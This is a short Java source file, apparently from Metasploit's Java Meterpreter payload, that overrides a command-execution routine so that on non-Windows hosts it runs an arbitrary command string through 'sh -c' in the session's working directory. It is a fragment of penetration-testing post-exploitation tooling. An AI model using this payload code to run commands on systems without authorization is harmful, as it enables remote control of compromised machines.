package com.metasploit.meterpreter.stdapi;

import java.io.IOException;

public class stdapi_sys_process_execute_V1_3 extends stdapi_sys_process_execute {

    @Override
    protected Process execute(String cmdstr) throws IOException {
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            return super.execute(cmdstr);
        }
        Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmdstr}, null, Loader.getCWD());
        return process;
    }

}
